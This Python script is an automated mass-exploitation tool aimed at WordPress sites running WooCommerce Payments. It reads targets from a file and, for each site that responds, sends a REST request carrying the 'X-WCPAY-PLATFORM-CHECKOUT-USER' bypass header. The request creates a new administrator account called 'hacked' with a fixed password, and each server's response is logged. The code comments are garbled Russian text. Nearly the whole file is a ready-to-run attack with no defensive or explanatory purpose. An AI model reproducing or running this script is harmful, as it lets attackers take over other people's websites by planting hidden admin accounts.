import requests
# struct libs
import asyncio
import aiohttp

def delete_symbols(string):
    return string.translate({ord(i): None for i in '/'})


# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ # –ø–æ—Ç–æ–º –¥–æ–ø–∏—Å–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É –Ω–∞ –ø–ª–∞–≥–∏–Ω—ã –∞ –ø–æ–∫–∞ —á—Ç–æ —Ç–æ–ª—å–∫–æ 200 —Å—Ç–∞—Ç—É—Å —Å–µ—Ä–≤–µ—Ä–∞
async def check_vulnerability(target):
    try: 
        if requests.get(target).status_code == 200: return True
        # return nm.scan(target)
    except:
        print(f"[!] target: syntax not supported or server not exist")


# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ 
async def exploit_vulnerability(target):
    async with aiohttp.ClientSession(trust_env=True) as session:
        url = f'{target}?rest_route=/wp/v2/users' #wp-json doesnt work bypass ?rest_route=
        headers = {
            'Content-Type': 'application/json',
            'X-WCPAY-PLATFORM-CHECKOUT-USER': '1'
        }
        data = {
            "username": "hacked",
            "email":"asdf@hfdsa.com",
            "password":"h3ll0w0rld",
            "roles": ["administrator"]
        }
        async with session.post(url, json=data, headers=headers) as response:
            response_text = await response.text()
            print(f"[[32m{url}[0m ]:{response.status}")
            if response.status != 404:
                print(f"[32m[{url}[0m ]:\n{response_text}")
            return (f"STATUS: \n{response.status}\nRESPONSE :\n{response_text}")

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –≤ —Ñ–∞–π–ª
def save_results(filename, results):
    with open(filename, 'w') as f:
        f.write(results)

# –ß—Ç–µ–Ω–∏–µ —Ü–µ–ª–µ–π –∏–∑ —Ñ–∞–π–ª–∞
with open('targets.txt', 'r') as file:
    targets = file.readlines()

async def main():
    tasks = []
    for target in targets:
        target = target.strip()
        tasks.append(asyncio.create_task(process_target(target)))

    await asyncio.gather(*tasks)

async def process_target(target):
    if await check_vulnerability(target):
        print(f"[32m[+]IP: {target}[0m ")
        exploit_result = await exploit_vulnerability(target)
        save_results(f"results_{delete_symbols(target)}.txt", exploit_result)

if __name__ == '__main__':
    asyncio.run(main())
